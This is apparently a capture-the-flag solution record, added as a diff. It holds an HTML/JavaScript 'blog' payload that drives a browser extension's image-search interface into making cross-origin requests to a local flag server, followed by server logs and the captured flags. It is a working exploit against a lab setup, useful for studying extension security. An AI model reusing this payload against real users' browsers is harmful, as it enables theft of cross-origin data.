@@ -1,0 +1,129 @@
+Please input your token: 256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H
+
+Input your blog HTML below: (end with a separate line of text "EOF")
+
+<body style="overflow: visible">
+  <image
+    id="my_img"
+    src="127.0.0.1:30000/login"
+    style="
+      width: 100vw;
+      height: 100vh;
+      background-image: url(http://127.0.1.14:1919/login);
+    "
+  ></image>
+  <iframe src="http://127.0.1.14:1919/read_flag"></iframe>
+</body>
+<script defer>
+  function _log(e) {
+    console.log(e);
+    document.title += e;
+  }
+  window.addEventListener("message", function (e) {
+    _log(e);
+  });
+  window.addEventListener("sendDataToContentScript", function (e) {
+    _log(e);
+    _log(JSON.stringify(e.detail));
+  });
+  setTimeout(() => {
+    // _log(
+    //   document.getElementsByClassName(
+    //     "index-module__imgSearch_hover_content--c5JEb"
+    //   )[0].innerHTML
+    // );
+    // var img = document.getElementsByTagName("img")[0];
+    /** @type {HTMLImageElement} */
+    var my_img = document.getElementById("my_img");
+    my_img.focus();
+    my_img.dispatchEvent(
+      new MouseEvent("mousemove", {
+        bubbles: true,
+        target: my_img,
+        clientX: 10,
+        clientY: 10,
+      })
+    );
+
+    // const s = document.getElementsByClassName(
+    //   "index-module__imgSearch_hover_rightWrapper--VZGcY"
+    // )[0];
+    // s.focus();
+
+    my_img.src = "http://127.0.1.14:1919/read_flag";
+    // my_img.src = "newtab.html";
+
+    var search = document.getElementsByClassName(
+      "index-module__imgSearch_hover_content_text--WI0by"
+      // "index-module__imgSearch_hover_content--c5JEb"
+    )[0];
+    _log("Found search");
+    // search.focus();
+    search.click();
+
+    var ifr = document.getElementsByTagName("iframe")[0];
+    ifr.addEventListener("message", function (e) {
+      _log(e);
+    });
+
+    var close = document.getElementsByClassName(
+      "index-module__closeIconWrapper--fA3Su"
+    )[0];
+    close.click();
+
+    setTimeout(() => {
+      search.click();
+    }, 1000);
+    // _log(ifr.src);
+    // _log(ifr.contentWindow.document.body.innerHTML);
+    // var iframe = document.getElementsByClassName(
+    //   "index-module__imgSearch_leftLayout_iframe--exsY5"
+    // );
+    // _log(iframe.innerHTML);
+    // /** @type {HTMLIFrameElement} */
+    // const i = iframe;
+    // _log(i.contentWindow.document.body.innerHTML);
+    // /** @type {HTMLCollectionOf<HTMLImageElement>} */
+    // const img = i.contentWindow.document.getElementsByTagName("img");
+    // for (const i of img) _log(i);
+    // _log(i.contentWindow.document.body.innerHTML);
+    // for (const img of document.getElementsByTagName("img"))
+    //   console.log(img.src);
+  }, 1000);
+</script>
+
+
+EOF
+
+Starting servers...
+ * Serving Flask app 'flag_server'
+ * Serving Flask app 'hacker_server'
+ * Debug mode: off
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://127.0.1.14:1919
+Press CTRL+C to quit
+
+Starting browser with bxx-extension...
+
+Logging in...
+127.0.0.1 - - [17/Oct/2024 14:52:43] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [17/Oct/2024 14:52:43] "GET /favicon.ico HTTP/1.1" 404 -
+
+Visiting your blog...
+127.0.0.1 - - [17/Oct/2024 14:52:44] "GET /blog HTTP/1.1" 200 -
+127.0.0.1 - - [17/Oct/2024 14:52:44] "GET /127.0.0.1:30000/login HTTP/1.1" 404 -
+127.0.0.1 - - [17/Oct/2024 14:52:44] "GET /login HTTP/1.1" 200 -
+FLAG SERVER: not logged in :(
+127.0.0.1 - - [17/Oct/2024 14:52:44] "GET /read_flag HTTP/1.1" 200 -
+127.0.0.1 - - [17/Oct/2024 14:52:44] "GET /favicon.ico HTTP/1.1" 404 -
+FLAG SERVER: not logged in :(
+127.0.0.1 - - [17/Oct/2024 14:52:45] "GET /read_flag HTTP/1.1" 200 -
+FLAG SERVER: your flag is flag{crOSS-OrIGin-rEqUesTS-thROUGh-EXtENsIONs}
+127.0.0.1 - - [17/Oct/2024 14:52:46] "GET /read_flag HTTP/1.1" 200 -
+
+The page title is: Found search[object MessageEvent][object CustomEvent]{"action":"imgUrl2Base64_received","message":"data:text/html;base64,YW5vdGhlciBmbGFnIGlzIGZsYWd7VEhJUy12dWxuZXJBYmlsaVRZLVdPclRILTEyNTBjbnktb04tc3JjfQ=="}
+
+See you later :)
+
+--- 程序已退出 [retcode=0] ---
